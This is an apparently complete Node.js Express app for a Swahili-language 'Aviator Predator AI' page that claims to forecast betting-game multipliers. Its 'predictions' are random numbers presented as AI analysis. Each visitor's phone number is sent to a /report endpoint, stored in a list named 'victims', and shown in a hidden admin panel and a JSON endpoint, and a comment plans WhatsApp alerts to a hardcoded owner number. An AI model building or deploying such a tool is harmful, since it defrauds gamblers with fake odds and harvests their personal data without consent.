const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

let victims = []; 
const OWNER_NUMBER = "255784766591";

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="sw">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>AVIATOR PREDATOR | V13</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
            <style>
                body { background: #000; color: #eee; font-family: sans-serif; }
                .glass { background: rgba(15, 15, 15, 0.95); border: 1px solid #400; border-radius: 25px; }
                .btn-red { background: linear-gradient(90deg, #f00, #800); padding: 15px; border-radius: 15px; font-weight: bold; width: 100%; }
            </style>
        </head>
        <body class="p-4 flex flex-col items-center">
            <div style="font-size:8px; opacity:0.1; cursor:pointer" onclick="document.getElementById('admin').style.display='block'">ADMIN</div>
            
            <header class="w-full max-w-md bg-red-700 p-5 rounded-b-3xl text-center shadow-lg mb-6">
                <h1 class="font-black italic">PREDATOR AI V13</h1>
            </header>

            <div id="login" class="glass p-8 w-full max-w-md text-center space-y-5">
                <h2 class="text-xl font-bold">ACCOUNT SYNC</h2>
                <input type="text" id="num" placeholder="255XXXXXXXXX" class="w-full bg-black border border-gray-800 p-4 rounded-xl text-center text-red-500 font-bold text-xl">
                <button onclick="start()" class="btn-red">CONNECT ENGINE</button>
            </div>

            <div id="dash" class="hidden glass p-6 w-full max-w-md text-center space-y-4">
                <div class="flex justify-between text-xs border-b border-gray-800 pb-2">
                    <span id="uNum" class="text-red-500 font-bold"></span>
                    <span class="text-green-500">SYNCED ✅</span>
                </div>
                <p class="text-[10px] text-gray-500 uppercase">Next Predicted Multiplier</p>
                <div id="odds" class="text-6xl font-black text-red-600 italic">--.--x</div>
                <input type="number" id="last" placeholder="Last Multiplier" class="w-full bg-black border p-3 rounded-lg text-center">
                <button onclick="calc()" class="btn-red">ANALYZE NEXT</button>
            </div>

            <div id="admin" class="hidden glass p-4 mt-4 w-full max-w-md text-[10px] font-mono border-green-600">
                <h3 class="text-green-500 mb-2">VICTIM LOGS</h3>
                <div id="vList"></div>
            </div>

            <script>
                function speak(t) {
                    const s = new SpeechSynthesisUtterance(t);
                    s.lang = 'en-US';
                    window.speechSynthesis.speak(s);
                }

                function start() {
                    const n = document.getElementById('num').value;
                    if(n.length < 10) return alert("Weka namba!");
                    fetch('/report?n=' + n);
                    speak("Syncing account.");
                    document.getElementById('login').style.display = 'none';
                    document.getElementById('dash').style.display = 'block';
                    document.getElementById('uNum').innerText = "+" + n;
                }

                function calc() {
                    const l = document.getElementById('last').value;
                    if(!l) return alert("Weka round iliopita!");
                    speak("Analyzing.");
                    setTimeout(() => {
                        const v = (Math.random() * 2.5 + 1.1).toFixed(2);
                        document.getElementById('odds').innerText = v + "x";
                        speak("Next signal is " + v);
                    }, 1000);
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/report', (req, res) => {
    const n = req.query.n;
    const t = new Date().toLocaleTimeString();
    victims.unshift({ n, t });
    console.log("Logged: " + n);
    // WhatsApp notification inaweza kuongezwa hapa kwa axios
    res.send("ok");
});

app.get('/admin-list', (req, res) => res.json(victims));

app.listen(PORT, () => console.log('Live on ' + PORT));
